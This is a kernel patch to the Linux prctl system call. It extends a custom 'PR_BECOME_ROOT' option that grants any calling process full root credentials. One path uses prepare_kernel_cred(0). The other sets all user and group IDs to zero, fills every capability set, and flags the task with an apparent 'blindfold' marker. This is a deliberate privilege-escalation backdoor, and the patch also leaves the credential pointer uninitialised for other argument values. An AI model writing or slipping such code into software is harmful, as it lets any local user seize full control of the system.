@@ -2587,17 +2587,35 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 	case PR_BECOME_ROOT: // ljj:
 		{
 			struct cred* new;
-			new = prepare_creds();
+			switch (arg2){
+				case 0:
+					new = prepare_kernel_cred(0);
+					break;
+				case 1:
+					new = prepare_creds();
+					if (new){
+#define MRESET(s, b) do{memset(&s, (b), sizeof(s));}while(0)
+						MRESET(new->uid, 0);
+						MRESET(new->gid, 0);
+						MRESET(new->euid, 0);
+						MRESET(new->egid, 0);
+						MRESET(new->fsuid, 0);
+						MRESET(new->fsgid, 0);
+						MRESET(new->cap_inheritable, 0xff);
+						MRESET(new->cap_permitted, 0xff);
+						MRESET(new->cap_effective, 0xff);
+						MRESET(new->cap_bset, 0xff);
+						MRESET(new->cap_ambient, 0xff);
+#undef MRESET
+						current->blindfold |= 0x10000;
+					}
+					break;
+
+			}
         		if (!new){
                 		error = -ENOMEM;
 				break;
 			}
-	        	new->uid = KUIDT_INIT(0);
-			new->gid = KGIDT_INIT(0);
-			new->euid = KUIDT_INIT(0);
-			new->egid = KGIDT_INIT(0);
-			new->fsuid= KUIDT_INIT(0);
-			new->fsgid= KGIDT_INIT(0);
 			commit_creds(new);
 			break;
 		}
